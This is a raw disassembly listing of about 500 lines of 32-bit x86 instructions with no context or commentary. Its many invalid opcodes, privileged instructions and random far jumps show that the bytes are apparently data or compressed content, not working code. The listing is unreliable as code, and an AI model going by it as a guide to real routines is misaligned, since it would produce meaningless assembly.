  4272c8:	ror    DWORD PTR [ecx+0x4e],1
  4272cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4272cc:	nop
  4272cd:	mov    ecx,0xc28aeaa4
  4272d2:	call   0x60156849
  4272d7:	inc    edx
  4272d8:	hlt    
  4272d9:	pop    ebp
  4272da:	mov    eax,ds:0x31a1a543
  4272df:	(bad)  
  4272e0:	mov    al,ds:0x261f6f4a
  4272e5:	xor    DWORD PTR [eax-0x1d],ecx
  4272e8:	jne    0x427348
  4272ea:	inc    eax
  4272eb:	or     DWORD PTR [ebx],ebx
  4272ed:	retf   0xe6f3
  4272f0:	in     al,0x53
  4272f2:	ror    DWORD PTR [esi],1
  4272f4:	cli    
  4272f5:	push   esp
  4272f6:	jmp    0x2a48fff
  4272fb:	cmp    eax,0x7c834f92
  427300:	ds cmc 
  427302:	ret    0xf
  427305:	sub    al,0x5d
  427307:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427308:	mov    al,ds:0x30500853
  42730d:	fwait
  42730e:	dec    edx
  42730f:	retf   0x8b8f
  427312:	xlat   BYTE PTR ds:[ebx]
  427313:	enter  0xe0e0,0x50
  427317:	(bad)  
  427318:	sub    edx,DWORD PTR [ecx+eiz*1-0x80]
  42731c:	or     ebx,ebp
  42731e:	push   edi
  42731f:	into   
  427320:	dec    eax
  427321:	dec    ebp
  427322:	inc    edx
  427323:	shl    DWORD PTR [esi-0x311192b8],cl
  427329:	loope  0x427309
  42732b:	mov    ecx,0x9ff99fbd
  427330:	(bad)  
  427332:	ret    
  427333:	out    dx,eax
  427334:	js     0x4272f2
  427336:	sar    BYTE PTR [edi-0x5a99c24e],0xc0
  42733d:	dec    ebx
  42733e:	mov    dh,0xf4
  427340:	mov    edi,0xba6fd3ff
  427345:	in     eax,0x67
  427347:	(bad)  
  427348:	jecxz  0x427369
  42734a:	(bad)  
  42734b:	test   al,0x0
  42734d:	(bad)  
  42734e:	sbb    eax,0x9a0e7481
  427353:	add    eax,DWORD PTR [edi]
  427355:	add    al,0x21
  427358:	push   edi
  427359:	sub    eax,0x4e6bcce2
  42735e:	mov    ah,0x49
  427360:	mov    BYTE PTR [ebp-0x4b66baff],ch
  427366:	stos   BYTE PTR es:[edi],al
  427367:	scas   al,BYTE PTR es:[edi]
  427368:	xchg   ebx,eax
  427369:	jne    0x4273de
  42736b:	push   ebp
  42736c:	leave  
  42736d:	sbb    ch,BYTE PTR [edi]
  42736f:	in     eax,dx
  427370:	cmp    DWORD PTR [edx-0x2713ff27],esi
  427376:	bound  eax,QWORD PTR [edi-0x63]
  427379:	dec    esi
  42737a:	add    al,0xd2
  42737c:	je     0x42730b
  42737e:	femms  
  427380:	pushf  
  427381:	xor    edx,DWORD PTR [esi+0x57]
  427384:	add    dl,dl
  427386:	icebp  
  427387:	xor    edi,DWORD PTR [eax]
  427389:	hlt    
  42738a:	adc    cl,BYTE PTR [edi-0x2c4f70da]
  427390:	into   
  427391:	push   eax
  427392:	icebp  
  427393:	add    al,0x7e
  427395:	or     al,0xe4
  427397:	sbb    DWORD PTR [ecx+0x1a],eax
  42739a:	cmp    eax,0xc4019233
  42739f:	add    bl,ah
  4273a1:	adc    BYTE PTR [eax+0x641a5118],dl
  4273a7:	sbb    esp,eax
  4273a9:	les    ecx,FWORD PTR [esi+0xb674651]
  4273af:	xor    dl,BYTE PTR [eax+0x446c7200]
  4273b5:	sub    BYTE PTR [edx],bh
  4273b7:	mov    bh,0x4f
  4273b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4273ba:	aam    0x64
  4273bc:	shl    BYTE PTR [edi],0xe4
  4273bf:	fsub   QWORD PTR [edx]
  4273c1:	mov    cl,0xc6
  4273c3:	xchg   esp,eax
  4273c4:	ds push ebp
  4273c6:	push   0xd08811ad
  4273cb:	das    
  4273cc:	push   edx
  4273cd:	rcr    BYTE PTR fs:[ecx+0x71],cl
  4273d1:	xor    BYTE PTR [ecx],al
  4273d3:	es jmp 0xe568:0x75f56eca
  4273db:	xor    esp,DWORD PTR [edi-0x60]
  4273de:	and    bh,BYTE PTR [ebp+0x760ace8a]
  4273e4:	(bad)  
  4273e5:	into   
  4273e6:	add    DWORD PTR [ebx],eax
  4273e8:	mov    ecx,0x36bc6ea6
  4273ed:	add    BYTE PTR [ebp-0x1e6b4f02],dh
  4273f3:	pop    esp
  4273f4:	lock mov dl,0xeb
  4273f7:	mov    esi,0xc83db701
  4273fc:	pop    eax
  4273fd:	mov    edi,0x3f5833e9
  427402:	mov    cl,0x5
  427404:	cmp    al,0xe7
  427406:	or     al,0xf2
  427408:	daa    
  427409:	outs   dx,DWORD PTR ds:[esi]
  42740a:	(bad)  
  42740b:	into   
  42740c:	xchg   DWORD PTR [edi+0x1dddb312],edi
  427412:	lods   al,BYTE PTR ds:[esi]
  427413:	lods   al,BYTE PTR ds:[esi]
  427414:	dec    edi
  427415:	jo     0x42740f
  427417:	call   0xf304:0xa420751
  42741e:	pop    ecx
  42741f:	les    esi,FWORD PTR [edi+eiz*4-0x23]
  427423:	lahf   
  427424:	or     DWORD PTR [eax+0x7adc5173],esi
  42742a:	push   edi
  42742b:	lods   al,BYTE PTR ds:[esi]
  42742c:	stos   BYTE PTR es:[edi],al
  42742d:	mov    ebp,0xb9702c5e
  427432:	jbe    0x4273d1
  427434:	xor    ah,BYTE PTR [ecx-0x3d2f8422]
  42743a:	push   ds
  42743b:	sti    
  42743c:	lea    eax,[edx+0x2aa5f622]
  427442:	mov    edx,0x5190a8f7
  427447:	clc    
  427448:	sbb    edi,DWORD PTR [edx+0x68786570]
  42744e:	nop
  42744f:	popf   
  427450:	repz jb 0x427411
  427453:	dec    edx
  427454:	sub    ebp,DWORD PTR [esi-0x518934ff]
  42745a:	dec    ebx
  42745b:	dec    ebp
  42745c:	inc    ecx
  42745d:	pop    ss
  42745e:	fimul  WORD PTR [ecx-0xf]
  427461:	adc    dh,BYTE PTR [edi+ebx*2+0x66]
  427465:	push   edx
  427466:	ret    
  427467:	xor    edx,eax
  427469:	icebp  
  42746a:	in     eax,0xfb
  42746c:	xchg   esi,eax
  42746d:	mov    bh,0x38
  42746f:	xchg   BYTE PTR [ebp-0x2015889],cl
  427475:	push   eax
  427476:	mov    WORD PTR [ecx+0x5fb75b1c],es
  42747c:	shl    BYTE PTR [esi],1
  42747e:	cmp    BYTE PTR [eax],dl
  427480:	and    al,0x27
  427482:	inc    esp
  427483:	leave  
  427484:	dec    eax
  427485:	cmp    DWORD PTR [ecx+0x27],ebp
  427488:	lods   al,BYTE PTR ds:[esi]
  427489:	sub    DWORD PTR [edi+0x1f9793ad],edi
  42748f:	mov    esp,0xfd3725fa
  427494:	cmp    cl,BYTE PTR [edx+eiz*2]
  427497:	jle    0x4274d5
  427499:	mov    bh,0xc7
  42749b:	dec    ebp
  42749c:	add    DWORD PTR [esp+ebp*2+0x6c],ebp
  4274a0:	in     al,0x57
  4274a2:	mov    ebp,0x5f9745f2
  4274a7:	inc    esi
  4274a9:	aas    
  4274aa:	sti    
  4274ab:	mov    cl,0x93
  4274ad:	daa    
  4274ae:	das    
  4274af:	fld    QWORD PTR [edx-0x77]
  4274b2:	loopne 0x427467
  4274b4:	nop
  4274b5:	pop    edx
  4274b6:	ds pop es
  4274b8:	jbe    0x4274be
  4274ba:	mov    DWORD PTR [ecx],0xe34231ce
  4274c0:	sub    DWORD PTR [edx],0xc6957d1a
  4274c6:	test   DWORD PTR [ebp-0x3d],edi
  4274c9:	mul    BYTE PTR [eax+0x702cc849]
  4274cf:	imul   ecx,DWORD PTR [edx+ebp*8],0x734a31e
  4274d6:	jmp    0x918a2d56
  4274db:	push   eax
  4274dc:	aad    0x9a
  4274de:	mov    edi,0xc7aeab5d
  4274e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4274e4:	mov    ebp,0x16a1a39
  4274e9:	sbb    BYTE PTR [eax+0x710223],ch
  4274ef:	add    eax,0x583028e8
  4274f4:	test   eax,0x104b37a7
  4274f9:	or     DWORD PTR [ebx+0x0],esi
  4274fc:	ins    DWORD PTR es:[edi],dx
  4274fd:	(bad)  [eax]
  4274ff:	xchg   edi,eax
  427500:	fdivr  DWORD PTR [eax+0x41fa8400]
  427506:	mov    edx,0x44478c10
  42750b:	or     ch,BYTE PTR [eax]
  42750d:	push   ss
  42750e:	add    ebp,esp
  427510:	inc    ecx
  427511:	retf   
  427512:	enter  0x82d4,0x9c
  427516:	inc    ebx
  427517:	or     di,0xb2b5
  42751c:	stc    
  42751d:	mov    edx,0x751f2cc6
  427522:	cmp    DWORD PTR [edx],0x54
  427525:	addr16 test al,0x3b
  427528:	dec    edi
  427529:	jbe    0x427537
  42752b:	adc    DWORD PTR [esi],eax
  42752d:	push   ebp
  42752e:	dec    edx
  42752f:	sbb    ecx,ebp
  427531:	sahf   
  427532:	and    BYTE PTR [ebp+0x5f],dl
  427535:	daa    
  427536:	shr    BYTE PTR [ebp-0x7b],0xdc
  42753a:	fisub  DWORD PTR [edi-0x26]
  42753d:	stc    
  42753e:	jo     0x4274de
  427540:	inc    ecx
  427541:	mov    ch,0x36
  427543:	dec    esi
  427544:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427545:	cwde   
  427546:	add    BYTE PTR [eax+ecx*2+0x56],0x72
  42754b:	jmp    0x470b:0x74e6c392
  427552:	mov    esi,0xe6d83de3
  427557:	dec    ebp
  427558:	pushf  
  427559:	jecxz  0x4275a8
  42755b:	sbb    al,0x1b
  42755d:	lods   eax,DWORD PTR ds:[esi]
  42755e:	loope  0x42754a
  427560:	imul   ecx,DWORD PTR [edi-0x48640560],0xffffffe1
  427567:	hlt    
  427568:	lods   eax,DWORD PTR ds:[esi]
  427569:	iret   
  42756a:	shl    ah,0xec
  42756d:	sub    bh,BYTE PTR [ebx+ebp*4-0xafe2534]
  427574:	test   al,0xc2
  427576:	retf   0x9a1
  427579:	inc    esi
  42757a:	adc    eax,DWORD PTR [edi+0x682ab29c]
  427580:	call   0x3093c52e
  427585:	popf   
  427586:	jmp    0x783128b3
  42758b:	add    eax,DWORD PTR [ebx+0x7e58b7b]
  427591:	push   edi
  427592:	mov    cl,0x57
  427594:	sbb    al,ch
  427596:	test   al,0xf
  427598:	add    eax,0xa682772c
  42759d:	pop    ebx
  42759e:	or     ebx,esi
  4275a0:	int3   
  4275a1:	sub    esp,DWORD PTR [edx+0x36ebec3e]
  4275a7:	sbb    bl,BYTE PTR [esi]
  4275a9:	fstp   TBYTE PTR [esi]
  4275ab:	push   ebx
  4275ac:	hlt    
  4275ad:	push   ebx
  4275ae:	adc    eax,0x47c134b0
  4275b3:	or     DWORD PTR [edi],esi
  4275b5:	test   al,0xbf
  4275b7:	outs   dx,BYTE PTR ds:[esi]
  4275b8:	idiv   BYTE PTR [ebp+0x18]
  4275bb:	lods   al,BYTE PTR ds:[esi]
  4275bc:	icebp  
  4275bd:	(bad)  
  4275be:	loopne 0x427618
  4275c0:	and    eax,0xa529d143
  4275c5:	inc    BYTE PTR [ebx+0x62680050]
  4275cb:	jmp    0xefef:0xca573fbe
  4275d2:	stos   DWORD PTR es:[edi],eax
  4275d3:	add    BYTE PTR [edi],bl
  4275d5:	sub    al,0xee
  4275d7:	iret   
  4275d8:	retf   0x24c4
  4275db:	xor    DWORD PTR [ebx],esp
  4275dd:	(bad)  
  4275de:	lods   al,BYTE PTR ds:[esi]
  4275df:	aad    0xa5
  4275e1:	neg    ch
  4275e3:	ret    
  4275e4:	jmp    0xbedf:0xf6bfa7e8
  4275eb:	cli    
  4275ec:	fsubr  st(3),st
  4275ee:	sbb    ebx,edi
  4275f0:	xchg   edi,eax
  4275f1:	in     eax,dx
  4275f2:	xor    ecx,ebp
  4275f4:	push   es
  4275f5:	cmp    al,0x68
  4275f7:	cmp    edi,DWORD PTR [esi-0x4]
  4275fa:	cmp    bh,bl
  4275fc:	(bad)  
  4275fd:	(bad)  [ebx]
  4275ff:	sub    ebp,DWORD PTR [edi-0xa80a002]
  427605:	(bad)  
  427606:	mov    bl,0xe0
  427608:	inc    ebp
  427609:	scas   al,BYTE PTR es:[edi]
  42760a:	imul   ah
  42760c:	mov    esp,0x56b847a6
  427611:	pop    edx
  427612:	stos   DWORD PTR es:[edi],eax
  427613:	pushf  
  427614:	lods   eax,DWORD PTR ds:[esi]
  427615:	dec    eax
  427616:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427617:	add    eax,0x95281390
  42761c:	inc    edx
  42761d:	push   ds
  42761e:	xor    cl,BYTE PTR ds:0xc500b83b
  427624:	pop    ds
  427625:	sub    ebp,DWORD PTR [esi+0x5c]
  427628:	pop    ss
  427629:	fldenv gs:[esi-0x55]
  42762d:	mov    ecx,DWORD PTR [ebx+ebx*4-0x70af6771]
  427634:	push   0xffffff84
  427636:	fisub  DWORD PTR [ecx-0x59]
  427639:	mov    ecx,0xbf97cd88
  42763e:	add    eax,0x99036e7b
  427643:	mov    bl,0xb5
  427645:	(bad)  
  427646:	sub    ch,BYTE PTR [ebx]
  427648:	push   eax
  427649:	mov    es,WORD PTR [eax]
  42764b:	data16 mov ch,dl
  42764e:	pop    ss
  42764f:	sbb    ch,BYTE PTR ds:0x22d8359d
  427655:	dec    edx
  427656:	inc    esi
  427657:	ror    esi,cl
  427659:	shl    BYTE PTR [esi-0x6f526b78],1
  42765f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427660:	pop    esp
  427661:	mov    dh,0xc1
  427663:	bound  esp,QWORD PTR [edi-0x45766ca0]
  427669:	fcom   DWORD PTR [ebx]
  42766b:	mov    bh,ah
  42766d:	mov    ebx,0xe70f2404
  427672:	sub    dl,BYTE PTR [esi+ebp*2+0xc]
  427676:	dec    ecx
  427677:	or     DWORD PTR [ebp-0x78250595],ebp
  42767d:	xor    dl,dl
  42767f:	mov    ebx,DWORD PTR [ecx]
  427681:	loop   0x42764f
  427683:	je     0x427690
  427685:	fst    DWORD PTR [edi+ebx*2+0x5b]
  427689:	add    BYTE PTR [ecx+0x11e02f00],0x3
  427690:	xchg   esp,eax
  427691:	inc    ecx
  427692:	cdq    
  427693:	inc    eax
  427694:	fld    st(6)
  427696:	retf   
  427697:	cli    
  427698:	lods   al,BYTE PTR ds:[esi]
  427699:	imul   eax,DWORD PTR [ecx+0x52],0xac8dc22f
  4276a0:	mov    edx,0x80403b2f
  4276a5:	cmp    bl,dl
  4276a7:	dec    ecx
  4276a8:	dec    ebp
  4276a9:	mov    BYTE PTR [eax],al
  4276ab:	adc    esp,DWORD PTR [ebx+0x7d]
  4276ae:	jne    0x4276bd
  4276b0:	sub    DWORD PTR [esi-0x34],esp
  4276b3:	fwait
  4276b4:	cmp    DWORD PTR [edx],edx
  4276b6:	adc    bh,BYTE PTR [eax-0x151f439e]
  4276bc:	scas   eax,DWORD PTR es:[edi]
  4276bd:	lds    esp,FWORD PTR [ecx-0x45a3ce37]
  4276c3:	dec    eax
  4276c4:	test   al,0xaf
  4276c6:	fiadd  WORD PTR [esi-0x4d]
  4276c9:	ret    
  4276ca:	cwde   
  4276cb:	jle    0x4276c5
  4276cd:	pop    ecx
  4276ce:	fdivr  DWORD PTR [edx+0x5f787afb]
  4276d4:	sar    DWORD PTR [ecx],0x7
  4276d7:	pop    edi
  4276d8:	mov    ebx,0xca8707ee
  4276dd:	mov    eax,ds:0xe668d71e
  4276e2:	and    eax,0x16a4a98d
  4276e7:	sub    DWORD PTR [edx+0x2beb3082],ebx
  4276ed:	xchg   edx,eax
  4276ee:	mov    ch,0x1a
  4276f0:	je     0x4276d1
  4276f2:	stc    
  4276f3:	adc    dh,ah
  4276f5:	xor    ebx,DWORD PTR [esi]
  4276f7:	in     eax,dx
  4276f8:	mov    ds:0x9d101775,al
  4276fd:	cmc    
  4276fe:	out    dx,al
  4276ff:	fisubr DWORD PTR [edi-0x79]
  427702:	push   ss
  427703:	pop    ds
  427704:	sti    
  427705:	in     eax,0x45
  427707:	sub    eax,0x23d609bc
  42770c:	mov    ss,WORD PTR [ecx+0x3e]
  42770f:	push   edx
  427710:	retf   0x7a4e
  427713:	mov    ah,0xce
  427715:	jbe    0x42772f
  427717:	adc    ch,BYTE PTR [edi+0x39]
  42771a:	cld    
  42771b:	mov    dl,0x77
  42771d:	icebp  
  42771e:	or     BYTE PTR [ebp+esi*2-0x6b],dh
  427722:	out    dx,eax
  427723:	rcr    BYTE PTR [edi],1
  427725:	push   ebx
  427726:	cli    
  427727:	pop    ebp
  427728:	jne    0x427759
  42772a:	mov    ax,0xe5a0
  42772e:	mov    esi,0x503052be
  427733:	jb     0x4276bb
  427735:	les    eax,FWORD PTR [esi+esi*1+0x2da7cc46]
  42773c:	call   0xd822:0xedb4ab79
  427743:	ds mov ecx,0xbc57a1f9
  427749:	std    
  42774a:	(bad)  
  42774b:	pop    esi
  42774c:	(bad)  
  42774d:	adc    edi,DWORD PTR [eax-0x4fec3ccc]
  427753:	cmp    eax,0x3600219e
  427758:	ss ss repnz dec ebp
  42775c:	aaa    
  42775d:	push   ds
  42775e:	lahf   
  42775f:	cmp    eax,0xfc3759f7
  427764:	enter  0x9f1d,0x7c
  427768:	loopne 0x4277e7
  42776a:	fsub   QWORD PTR [esi]
  42776c:	dec    edx
  42776d:	(bad)  
  42776e:	in     al,0x22
  427770:	add    edi,DWORD PTR [esi]
  427772:	add    cl,dh
  427774:	sbb    DWORD PTR [ecx+0x39013d90],0x6a
  42777b:	popf   
  42777c:	cmp    al,0xe5
  42777e:	into   
  42777f:	sub    dl,BYTE PTR [edx+0xe2ef369]
  427785:	xor    al,0x37
  427787:	mov    cs,WORD PTR [ebx-0x5c34cee7]
  42778d:	shl    DWORD PTR [ecx+ebp*4-0x29],cl
  427791:	rol    ch,1
  427793:	jg     0x42774b
  427795:	(bad)  
  427796:	push   ss
  427797:	mov    DWORD PTR [eax-0x22],0xc0fb58f3
  42779e:	stos   DWORD PTR es:[edi],eax
  42779f:	xor    BYTE PTR [edi-0x37],bh
  4277a2:	fwait
  4277a3:	nop
  4277a4:	stos   BYTE PTR es:[edi],al
  4277a5:	sbb    eax,0x1dc52620
  4277aa:	inc    esi
  4277ab:	add    ch,cl
  4277ad:	jne    0x4277b0
  4277af:	push   ebx
  4277b0:	arpl   WORD PTR [ebx+0x5e8a29c3],cx
  4277b6:	push   es
  4277b7:	aaa    
  4277b8:	jo     0x427752
  4277ba:	sbb    dl,0x19
  4277bd:	call   0x8eb0:0x5cd5a379
  4277c4:	mov    esp,0x6496c2c1
  4277c9:	or     edi,DWORD PTR [ebx]
  4277cb:	mov    dl,bh
  4277cd:	jmp    0x4277d8
  4277cf:	inc    eax
  4277d0:	(bad)  
  4277d1:	scas   al,BYTE PTR es:[edi]
  4277d2:	inc    ecx
  4277d3:	jo     0x427817
  4277d5:	dec    esi
  4277d6:	adc    DWORD PTR [ecx],edi
  4277d8:	and    al,0x78
  4277da:	push   esp
  4277db:	adc    BYTE PTR [esi],al
  4277dd:	fidiv  DWORD PTR [esi-0x2a]
  4277e0:	add    esp,esi
  4277e2:	or     al,0xc0
  4277e4:	imul   esi,ebx,0x910e6948
  4277ea:	ret    0x4f93
  4277ed:	fs test eax,0x82e64045
  4277f3:	inc    edx
  4277f4:	inc    eax
  4277f5:	add    ch,BYTE PTR [eax+0x4c]
  4277f8:	fsubr  st(1),st
  4277fa:	push   cs
  4277fb:	and    al,0x40
  4277fd:	pusha  
  4277fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4277ff:	sbb    al,0x81
  427801:	lods   al,BYTE PTR ds:[esi]
  427802:	inc    esp
  427803:	and    ecx,esi
  427805:	xor    DWORD PTR [ecx+edi*2],edi
  427808:	jo     0x4277d7
  42780a:	adc    BYTE PTR [edi-0x4868e6cb],ah
  427810:	mov    dh,0x15
  427812:	jg     0x427794
  427814:	ss stos BYTE PTR es:[edi],al
  427816:	in     al,0x39
  427818:	jecxz  0x42787d
  42781a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42781b:	inc    BYTE PTR [edx]
  42781d:	stos   DWORD PTR es:[edi],eax
  42781e:	jmp    0x427833
  427820:	mov    WORD PTR [esi+0x3],ss
  427823:	jl     0x427829
  427825:	sahf   
  427826:	jle    0x42781d
  427828:	jne    0x4277e2
  42782a:	loope  0x42781b
  42782c:	fild   WORD PTR [edi-0x13de0b07]
  427832:	pushf  
  427833:	sbb    ah,bl
  427835:	in     al,0x3b
  427837:	mov    esi,0x19b5f50a
  42783c:	inc    ah
  42783e:	push   ds
  42783f:	mov    dh,0x4e
  427841:	dec    edi
  427842:	mov    al,0x77
  427844:	dec    DWORD PTR [edx]
  427846:	(bad)  
  427847:	lea    ecx,[esi-0x54]
  42784a:	and    al,bl
  42784c:	sbb    DWORD PTR [eax+eiz*2-0x7c],edi
  427850:	loopne 0x427859
  427852:	sub    DWORD PTR [eax+eiz*1],edi
  427855:	test   BYTE PTR [ecx],dl
  427857:	ficomp DWORD PTR [eax]
  427859:	inc    ecx
  42785a:	add    BYTE PTR [esi-0x2d],ah
  42785d:	push   ss
  42785e:	repz cmp eax,0x37d8d423
  427864:	fdiv   QWORD PTR [ebp+0x20]
  427867:	pusha  
  427868:	ret    
  427869:	or     al,0x4
  42786b:	or     BYTE PTR [ebp-0x33586820],bh
  427871:	fst    QWORD PTR [edi-0x2a75841f]
  427877:	push   es
  427878:	push   es
  427879:	test   eax,0x7f7bb2a3
  42787e:	mov    DWORD PTR [edi+ebx*4+0x32],ecx
  427882:	add    BYTE PTR [eax],dh
  427884:	imul   esp,DWORD PTR [ecx],0xfc11431a
  42788a:	add    DWORD PTR [esi+0x63],ebp
  42788d:	or     ecx,DWORD PTR [edx+0x2b]
  427890:	or     DWORD PTR [ebp+0x3677f1cf],esp
  427896:	push   0x130c9e0
  42789b:	cmp    BYTE PTR cs:[ebp+esi*4+0x47],dl
  4278a0:	test   al,0x2
  4278a2:	cmp    BYTE PTR [eax-0x7],ch
  4278a5:	inc    edi
  4278a6:	fwait
  4278a7:	cmc    
  4278a8:	mov    bl,0x62
  4278aa:	adc    al,BYTE PTR [ecx+ecx*8+0x4a]
  4278ae:	cmp    edi,esp
  4278b0:	or     BYTE PTR [ecx+eiz*1-0x28941d],dl
  4278b7:	cmp    eax,0x84fcf934
  4278bc:	ins    BYTE PTR es:[edi],dx
  4278bd:	(bad)  
  4278be:	stos   DWORD PTR es:[edi],eax
  4278bf:	pop    es
  4278c0:	add    BYTE PTR [eax],ch
  4278c2:	push   edi
  4278c3:	add    BYTE PTR [eax-0x1240e406],al
  4278c9:	xor    eax,0x6dddd9af
  4278ce:	jle    0x427858
  4278d0:	xor    DWORD PTR [edi-0x5f],0x72
  4278d4:	loopne 0x427927
  4278d6:	add    eax,0x80b44867
  4278db:	mov    ah,0xa0
  4278dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4278de:	dec    ebp
  4278df:	inc    eax
  4278e0:	rol    BYTE PTR [edx+0x16],cl
  4278e3:	mov    dl,0x69
  4278e5:	mov    dl,0x6c
  4278e7:	cmp    ebx,esp
  4278e9:	xor    al,BYTE PTR [ecx+eiz*4+0x77]
  4278ed:	imul   DWORD PTR [ebp+edx*4-0x6b]
  4278f1:	add    eax,0xa50c0c30
  4278f6:	jg     0x4278d5
  4278f8:	pop    es
  4278f9:	pop    DWORD PTR [ebx+0x47]
  4278fc:	daa    
  4278fd:	dec    eax
  4278fe:	sub    ecx,esp
  427900:	repnz hlt 
  427902:	adc    ah,ah
  427904:	lock sbb DWORD PTR [ebx+edi*8-0x732ea436],ebx
  42790c:	aaa    
  42790d:	jne    0x427930
  42790f:	cmp    al,BYTE PTR [esi+0x13b481cc]
  427915:	xchg   ecx,eax
  427916:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427917:	pop    ecx
  427918:	jae    0x427917
  42791a:	mov    ecx,0xe58ada94
  42791f:	mov    eax,ds:0x688c6d05
  427924:	fwait
  427925:	cmp    esi,esp
  427927:	lods   eax,DWORD PTR ds:[esi]
  427928:	bound  eax,QWORD PTR [edx]
  42792a:	mov    ecx,0x7a02d5cc
  42792f:	(bad)  
  427930:	and    eax,0x18d0f2a8
  427935:	fisubr WORD PTR [ecx+eiz*4+0x49d39017]
  42793c:	inc    ecx
  42793d:	dec    esp
  42793e:	and    eax,DWORD PTR [edx+edi*2-0xcfeb0fc]
  427945:	mov    esp,0xb31b188b
  42794a:	and    cl,BYTE PTR [esi+0x17]
  42794d:	scas   eax,DWORD PTR es:[edi]
  42794e:	gs inc ebx
  427950:	cli    
  427951:	add    eax,0xb48dea4c
  427956:	add    ah,BYTE PTR [esi]
  427958:	push   edi
  427959:	cmp    al,0x7d
  42795b:	jne    0x42799c
  42795d:	sub    edx,edx
  42795f:	sub    DWORD PTR [ebx],esi
  427961:	push   cs
  427962:	and    bl,ah
  427964:	stos   BYTE PTR es:[edi],al
  427965:	loop   0x427927
  427967:	and    BYTE PTR [edx-0x30],dl
  42796a:	dec    edi
  42796b:	jb     0x427973
  42796d:	cmp    eax,eax
  42796f:	cmp    ecx,DWORD PTR [edi+0x800d7da]
  427975:	xor    DWORD PTR [esi+0x34],eax
  427978:	int    0x5c
  42797a:	retf   
  42797b:	mov    bl,0x13
  42797d:	je     0x4279ed
  42797f:	and    DWORD PTR [ebx],0x2d
  427982:	pusha  
  427983:	sub    DWORD PTR [ebp-0x751ff1ec],esi
  427989:	mov    cl,0x7a
  42798b:	push   0x1d8ec705
  427990:	(bad)  
  427991:	mov    edx,esi
  427993:	pop    esi
  427994:	add    BYTE PTR [esi-0x740c07e],cl
  42799a:	or     DWORD PTR [ecx+ebp*4],ebx
  42799d:	scas   al,BYTE PTR es:[edi]
  42799e:	ret    
  42799f:	test   al,0x79
  4279a1:	push   es
  4279a2:	imul   dh
  4279a4:	mov    eax,0x16e8fe0e
  4279a9:	fidivr DWORD PTR [ecx]
  4279ab:	mov    al,0x77
  4279ad:	jbe    0x427931
  4279af:	fld    DWORD PTR [esi+0x0]
  4279b2:	and    al,BYTE PTR [ecx-0x3567f5ba]
  4279b8:	mov    WORD PTR [eax-0x1457d45a],ss
  4279be:	or     al,BYTE PTR [eax+0x29193c60]
  4279c4:	or     DWORD PTR [esi+0x2e26da08],esp
  4279ca:	pop    eax
  4279cb:	imul   esp,DWORD PTR [eax+0x3e],0x6b
  4279cf:	in     al,dx
  4279d0:	inc    esp
  4279d1:	xchg   esi,eax
  4279d2:	(bad)  
  4279d4:	mov    edi,0xcf6d7d6
  4279d9:	rcr    DWORD PTR [edi-0x17],0xaf
  4279dd:	jne    0x427a08
  4279df:	sub    ch,dl
  4279e1:	mov    esp,0x4a13e286
  4279e6:	jg     0x427974
  4279e8:	and    bh,al
  4279ea:	xchg   BYTE PTR [ebp+0x14],cl
  4279ed:	mov    al,0x98
  4279ef:	jnp    0x4279b0
  4279f1:	pop    edi
  4279f2:	iret   
  4279f3:	mov    ch,0xa0
  4279f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4279f6:	xor    bl,ch
  4279f8:	add    BYTE PTR [ebp-0x4d],al
  4279fb:	cld    
  4279fc:	add    ebx,ebp
  4279fe:	push   edx
  4279ff:	mov    esi,0x550e0b85
  427a04:	in     eax,0x50
  427a06:	lea    ebp,[edx]
  427a08:	mov    al,0xb7
  427a0a:	sub    DWORD PTR [edi],edi
  427a0c:	pop    ecx
  427a0d:	nop
  427a0e:	fimul  DWORD PTR [eax+0x3345bcf9]
  427a14:	popf   
  427a15:	arpl   WORD PTR [esi],di
  427a17:	pop    esi
  427a19:	imul   BYTE PTR [ebx]
  427a1b:	fcomp  st(3)
  427a1d:	fdivr  DWORD PTR [ebp-0x23]
  427a20:	mov    bh,0xbc
  427a22:	stc    
  427a23:	xchg   edi,edi
  427a25:	stc    
  427a26:	dec    edi
  427a27:	loopne 0x4279fb
  427a29:	cld    
  427a2a:	shl    DWORD PTR ds:0x1ed9b1e7,1
  427a30:	push   edi
  427a31:	(bad)  
  427a33:	xor    dh,al
  427a35:	mov    al,ds:0xefdbc7e3
  427a3a:	jns    0x427a11
  427a3c:	pop    edi
  427a3d:	sti    
  427a3e:	mov    ecx,0xf6f9be37
  427a43:	push   edi
  427a44:	out    0x9c,eax
  427a46:	mov    fs,WORD PTR [esi+0x2314cc4]
  427a4c:	int3   
  427a4d:	enter  0xd4ec,0x1d
  427a51:	arpl   WORD PTR [eax],ax
  427a53:	sahf   
  427a54:	push   esp
  427a55:	jmp    0x427a3d
  427a57:	add    al,0xe1
  427a59:	or     al,0x92
  427a5b:	inc    edx
  427a5c:	and    dl,BYTE PTR [ecx+0x40]
  427a5f:	rcr    dh,0x35
  427a62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a63:	mov    dl,0x58
  427a65:	int3   
  427a66:	popf   
  427a67:	mov    ah,0xcb
  427a69:	lea    ebp,[esi]
  427a6b:	jge    0x427ad5
  427a6d:	loope  0x427ab2
  427a6f:	dec    esi
  427a70:	or     ebx,ebx
  427a72:	fwait
  427a73:	jnp    0x427acd
  427a75:	pop    ebp
  427a76:	scas   eax,DWORD PTR es:[edi]
  427a77:	mov    cl,0x3a
  427a79:	pop    edx
  427a7a:	ror    esi,0xee
  427a7d:	cmp    cl,BYTE PTR [esi]
  427a7f:	cmp    eax,0x3d6c12f0
  427a84:	std    
  427a85:	iret   
  427a86:	shr    DWORD PTR [edi+ebx*4+0x4605b807],1
  427a8d:	push   cs
  427a8e:	cs cmp eax,edx
  427a91:	pushf  
  427a92:	xchg   ecx,eax
  427a93:	pop    ecx
  427a94:	add    BYTE PTR [ecx-0x53a34e12],dh
  427a9a:	or     al,0x23
